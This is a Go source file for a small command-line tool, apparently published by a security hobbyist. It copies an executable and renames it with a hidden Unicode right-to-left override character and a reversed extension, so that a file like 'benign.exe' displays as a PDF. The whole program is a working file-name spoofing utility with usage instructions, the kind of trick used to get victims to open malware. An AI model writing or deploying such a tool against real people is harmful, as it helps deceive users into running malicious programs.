package main

import (
	"os"
	"io"
	"flag"
    "fmt"
	"path/filepath"
	"runtime"
	"time"
	
)

func reverseString(s string) (result string) {
   for _,v := range s {
    result = string(v) + result
  }
  return 
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func isError(err error) bool {
	if err != nil {
		fmt.Println(err.Error())
	}

	return (err != nil)
}

func copyFile(src, dst string) (int64, error) {

	sourceFileStat, err := os.Stat(src)
	if isError(err) {
		return 0,err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if isError(err) {
		return 0,err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if isError(err) {
		return 0,err
	}
	defer destination.Close()

	nBytes, err := io.Copy(destination, source)

	// Commit the file contents
	// Flushes memory to disk
	destination.Sync()


	return nBytes, err



}
func usage(){
	_, file,_,_ := runtime.Caller(1)
	filename := filepath.Base(file)

	fmt.Println(`
Usage: 

go run ` + filename + ` -src benign.exe -ext pdf
`)
}
func main() {

	banner:= `
██████╗ ██████╗ ██╗         
██╔══██╗╚════██╗██║         
██████╔╝ █████╔╝██║         
██╔══██╗██╔═══╝ ██║         
██║  ██║███████╗███████╗    
╚═╝  ╚═╝╚══════╝╚══════╝    
    
by Myo Soe (//cybersecurity.wtf)
`
	fmt.Println(banner)
	
    source_file := flag.String("src", "", "Source path to copy")
	spoof_ext := flag.String("ext", "", "Extension to spoof")
	flag.Parse()

	flagset := make(map[string]bool)
	flag.Visit(func(f *flag.Flag) { flagset[f.Name]=true } )

	if !flagset["src"] {
		usage()
		return
	}

	if !flagset["ext"] {
		usage()
		return
	}



	source_file_name := *source_file
	source_ext := filepath.Ext(*source_file)
	source_ext = source_ext[1:len(source_ext)]

	source_name := source_file_name[0:len(source_file_name)-(len(source_ext)+1)]
	reverse_spoof_ext := reverseString(*spoof_ext)
	
	destination_file := source_name + "\u202e" + reverse_spoof_ext + "." + source_ext
	
	fmt.Printf("\n\n[Config] \n - Source File Name: %s (.%s) \n - Extension to be spoofed: %s (%s) \n - Final output: %s\n", source_name,  source_ext, *spoof_ext,reverse_spoof_ext,destination_file)


	if fileExists(destination_file) {
		fmt.Println("\n[INFO] Destination file exists.")
		var err = os.Remove(destination_file)
		if isError(err) {
			return
		}
		fmt.Println("[INFO] Destination file deleted")
	}

	tmp_dst := "___tmp"

	if fileExists(tmp_dst) {
		os.Remove(tmp_dst)
	}

	nBytes, err := copyFile(*source_file, tmp_dst)

	fmt.Println("[INFO] Waiting 10 seconds")

	time.Sleep(10 * time.Second)

	os.Rename(tmp_dst, destination_file)

	if err != nil {
		fmt.Printf("[INFO] Copy operation failed %q\n", err)
	} else {
		fmt.Printf("\n[INFO] Successfully wrote to %s (%d bytes)\n\n", destination_file, nBytes)
	}




}